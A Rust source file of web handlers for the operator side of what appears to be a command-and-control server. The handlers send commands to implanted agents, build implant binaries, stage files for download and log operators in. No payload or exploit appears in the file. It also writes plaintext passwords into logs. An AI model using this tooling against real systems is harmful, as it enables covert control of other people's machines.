use std::{net::SocketAddr, sync::Arc};

use crate::{
    AUTH_COOKIE_NAME, COOKIE_TTL,
    admin_task_dispatch::{dispatch_table::admin_dispatch, implant_builder::build_all_bins},
    app_state::AppState,
    logging::{log_admin_login_attempt, log_error_async},
    middleware::{create_new_operator, verify_password},
};
use axum::{
    Json,
    extract::{Multipart, Path, State},
    http::{
        HeaderMap, StatusCode,
        header::{CONTENT_DISPOSITION, CONTENT_TYPE},
    },
    response::{Html, IntoResponse, Response},
};
use axum_extra::extract::{
    CookieJar,
    cookie::{Cookie, SameSite},
};
use shared::{
    net::AdminLoginPacket,
    tasks::{AdminCommand, BaBData, FileUploadStagingFromClient, WyrmResult},
};

pub async fn handle_admin_commands_on_agent(
    state: State<Arc<AppState>>,
    Path(uid): Path<String>,
    command: Json<AdminCommand>,
) -> (StatusCode, Vec<u8>) {
    let response_body_serialised = admin_dispatch(Some(uid), command.0, state).await;

    (StatusCode::ACCEPTED, response_body_serialised)
}

pub async fn handle_admin_commands_without_agent(
    state: State<Arc<AppState>>,
    command: Json<AdminCommand>,
) -> (StatusCode, Vec<u8>) {
    let response_body_serialised = admin_dispatch(None, command.0, state).await;

    (StatusCode::ACCEPTED, response_body_serialised)
}

pub async fn poll_agent_notifications(
    state: State<Arc<AppState>>,
    Path(uid): Path<String>,
) -> (StatusCode, String) {
    match state.db_pool.agent_has_pending_notifications(&uid).await {
        Ok(has_pending) => {
            if has_pending || state.connected_agents.contains_agent_by_id(&uid) {
                (StatusCode::OK, has_pending.to_string())
            } else {
                (StatusCode::NOT_FOUND, has_pending.to_string())
            }
        }
        Err(e) => {
            log_error_async(&format!("Error polling pending notifications. {e}")).await;
            (StatusCode::INTERNAL_SERVER_ERROR, "".to_string())
        }
    }
}

pub async fn build_all_binaries_handler(
    state: State<Arc<AppState>>,
    Json(data): Json<BaBData>,
) -> Response {
    let result = build_all_bins(&data.implant_key, state).await;

    match result {
        Ok(zip_bytes) => {
            //
            // Prepare the data response back to the client and send it.
            //
            let filename = format!("{}.7z", data.implant_key);
            (
                StatusCode::ACCEPTED,
                [
                    (CONTENT_TYPE, "application/x-7z-compressed".to_string()),
                    (
                        CONTENT_DISPOSITION,
                        format!("attachment; filename=\"{}\"", filename),
                    ),
                ],
                zip_bytes,
            )
                .into_response()
        }
        Err(e) => {
            log_error_async(&e).await;

            (
                StatusCode::INTERNAL_SERVER_ERROR,
                Html(format!("Error building binaries: {e}",)),
            )
                .into_response()
        }
    }
}

pub async fn admin_login(
    jar: CookieJar,
    state: State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<AdminLoginPacket>,
) -> (CookieJar, Response) {
    let ip = if let Some(h) = headers.get("X-Forwarded-For") {
        h.to_str().unwrap_or("Not Found")
    } else {
        "Not found"
    };
    let username = body.username;
    let password = body.password;

    // Lookup the operator from the db, if its empty we will create the user in the inner match here.
    let operator = match state.db_pool.lookup_operator(&username).await {
        Ok(o) => o,
        Err(e) => {
            match e {
                sqlx::Error::RowNotFound => {
                    // The db is empty so create the user. The db insert function checks
                    // for us if a user already exists, if so, it will panic as we don't want anybody
                    // and everybody creating accounts! And we aren't yet multiplayer
                    // create_new_operator(username, password, state.clone()).await;
                    create_new_operator(&username, &password, state.0.clone()).await;
                    log_admin_login_attempt(&username, &password, ip, true).await;
                    // Now try get the user again, and continue execution
                    state.db_pool.lookup_operator(&username).await.unwrap()
                }
                _ => {
                    log_error_async(&format!(
                        "There was an error with the db whilst trying to log in with creds: \
                        {username} {password}. {e}",
                    ))
                    .await;
                    log_admin_login_attempt(&username, &password, ip, false).await;
                    return (jar, StatusCode::INTERNAL_SERVER_ERROR.into_response());
                }
            }
        }
    };

    // We got a result.. lets check the password
    if let Some((db_username, db_hash, db_salt)) = operator {
        // Check the username is the same as the db username, as we are doing single operator ops right now
        // we dont want to allow for easier password spraying, at least username is one additional step of
        // complexity.

        if username.ne(&db_username) {
            log_admin_login_attempt(&username, &password, ip, false).await;
            return (jar, StatusCode::NOT_FOUND.into_response());
        }

        if verify_password(&password, &db_hash, &db_salt).await {
            // At this point in here we have successfully authenticated..
            log_admin_login_attempt(&username, &password, ip, true).await;

            let sid = state.create_session_key().await;

            let cookie = Cookie::build((AUTH_COOKIE_NAME, sid))
                .path("/")
                .http_only(true)
                .same_site(SameSite::None)
                .max_age(COOKIE_TTL.try_into().unwrap())
                .secure(true)
                .build();

            let jar = jar.add(cookie);
            return (jar, (StatusCode::ACCEPTED).into_response());
        } else {
            // Bad password...
            log_admin_login_attempt(&username, &password, ip, false).await;
            return (jar, StatusCode::NOT_FOUND.into_response());
        }
    }

    //
    // Anything that falls through to this point is invalid
    //
    log_admin_login_attempt(&username, &password, ip, false).await;
    (jar, StatusCode::NOT_FOUND.into_response())
}

/// Public route that is reachable only by the admin after going through
/// the middleware, serves as a health check as to whether their token is
/// valid or not.
pub async fn is_adm_logged_in() -> Response {
    StatusCode::OK.into_response()
}

pub async fn logout() -> Response {
    StatusCode::ACCEPTED.into_response()
}

pub async fn admin_upload(
    State(state): State<Arc<AppState>>,
    mut multipart: Multipart,
) -> StatusCode {
    let mut file_bytes = Vec::new();
    let mut download_name = String::new();
    let mut api_endpoint = String::new();

    while let Some(field) = multipart.next_field().await.unwrap_or(None) {
        match field.name() {
            Some("file") => {
                let fname = field.file_name().map(|f| f.to_string());
                let bytes = field.bytes().await.unwrap_or_default();
                file_bytes = bytes.to_vec();

                if download_name.is_empty() {
                    if let Some(fname) = fname {
                        download_name = fname;
                    }
                }
            }
            Some("download_name") => download_name = field.text().await.unwrap_or_default(),
            Some("api_endpoint") => api_endpoint = field.text().await.unwrap_or_default(),
            _ => {}
        }
    }

    if download_name.is_empty() || api_endpoint.is_empty() || file_bytes.is_empty() {
        return StatusCode::BAD_REQUEST;
    }

    let data = FileUploadStagingFromClient {
        download_name,
        api_endpoint,
        file_data: file_bytes,
    };
    let res = admin_dispatch(None, AdminCommand::StageFileOnC2(data), State(state)).await;
    StatusCode::from_u16(
        serde_json::from_slice::<Option<WyrmResult<String>>>(&res)
            .map(|r| {
                if matches!(r, Some(WyrmResult::Ok(_))) {
                    202
                } else {
                    500
                }
            })
            .unwrap_or(500),
    )
    .unwrap_or(StatusCode::INTERNAL_SERVER_ERROR)
}
